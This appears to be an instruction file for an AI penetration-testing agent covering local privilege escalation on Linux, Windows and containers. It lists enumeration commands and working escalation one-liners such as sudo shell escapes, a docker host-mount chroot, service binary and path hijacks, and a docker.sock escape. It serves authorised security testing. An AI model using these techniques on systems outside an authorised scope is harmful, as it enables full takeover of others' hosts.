---
name: privesc-overview
description: Linux and Windows local privilege escalation from an unprivileged shell to root/SYSTEM. Use when you have any foothold (shell, RDP, SSH) with limited privileges and need higher access on that same host. Do not use for domain-level escalation on a Windows host joined to AD — see active-directory instead.
phases: [privesc, post-exploitation]
tags: [privesc, linux, windows, gtfobins]
mitre: [T1548, T1068, T1055, T1543, T1053]
requires_tools: [linpeas, winpeas, pspy, linux-exploit-suggester]
---

Privesc is enumeration-first: the overwhelming majority of real findings are misconfiguration
(SUID/sudo/writable-service/weak-permission), not a kernel 0day. Enumerate exhaustively before
trying anything — a wrong guess wastes time and can crash a fragile host.

## Linux

**Enumerate first** (via `platform_shell`, or drop `linpeas.sh`/`les.sh` once installed):
```
sudo -l                                     # what can this user run as root, no password?
find / -perm -4000 -type f 2>/dev/null      # SUID binaries
find / -perm -2000 -type f 2>/dev/null      # SGID binaries
getcap -r / 2>/dev/null                     # Linux capabilities (cap_setuid etc.)
cat /etc/crontab; ls -la /etc/cron.*        # cron jobs — check script writability
id; groups                                  # docker/lxd/disk group membership = fast root
```
- **sudo -l** → any entry to [GTFOBins](https://gtfobins.github.io/) — a huge fraction of `sudo`
  privesc is one binary away (`sudo vim -c ':!/bin/sh'`, `sudo find . -exec /bin/sh \; -quit`).
- **SUID binaries** → cross-check the same GTFOBins list for the SUID (not sudo) technique —
  different payload shape, same site.
- **Writable cron/systemd unit run by root** → overwrite the script/unit, wait for the timer.
  `pspy` (no root needed) reveals cron/exec activity you can't see with `ps` as a low-priv user.
- **`docker`/`lxd` group membership** → mount the host filesystem into a container you control:
  `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`.
- **Kernel exploits** — last resort, only after config-based paths are exhausted (they crash
  hosts more often than they win): `linux-exploit-suggester.sh` against the exact kernel version.

## Windows

```
whoami /priv                                # SeImpersonate/SeAssignPrimaryToken -> Potato family
whoami /groups                              # local admin group membership already?
systeminfo                                  # patch level, for a targeted kernel/MSI exploit
wmic service get name,startname,pathname,startmode   # unquoted paths, writable service binaries
icacls "C:\Program Files\..."               # writable dirs a privileged service reads from
schtasks /query /fo LIST /v                 # scheduled tasks run as SYSTEM you can write to
```
- **`SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege` present** (common on service
  accounts/IIS app pools) → JuicyPotato/PrintSpoofer/RoguePotato family — near-instant SYSTEM.
- **Unquoted service path** (`C:\Program Files\Some App\service.exe` unquoted) with a writable
  parent directory → drop `Program.exe` where Windows' path-parsing tries it first.
- **Weak service permissions** (`sc qc <svc>` + `accesschk` show the service binary or the service
  config itself is writable by your user) → replace the binary or reconfigure `binPath` to your
  payload, restart the service.
- **AlwaysInstallElevated** (two registry keys both set) → any MSI you build runs as SYSTEM.
- Run `winpeas.exe`/`PrivescCheck.ps1` once installed — they automate all of the above and flag
  what's actually exploitable on this specific host, not a generic checklist.

## Containers

`docker.sock` mounted into the container, or the container running `--privileged`, is a host
escape, not just a container escape:
```
ls -la /var/run/docker.sock                 # writable -> spin up a privileged container
mount | grep -i cgroup                      # cgroup release_agent escape (privileged containers)
cat /proc/1/status | grep CapEff             # non-default effective capabilities
```

## Do not

- Fire a kernel exploit before exhausting configuration-based paths — a crashed host ends the
  engagement's foothold, a failed GTFOBins attempt costs nothing.
- Report a SUID/sudo entry as a finding without confirming the GTFOBins technique actually reaches
  a shell/file-read as the elevated user — the binary being SUID isn't the finding, the escalation
  is.
- Escalate on a host, then stop — situational awareness (`post-exploitation`) and a scope check
  (`shared/governance-rules`) come immediately after any successful escalation, before deciding
  what's next.
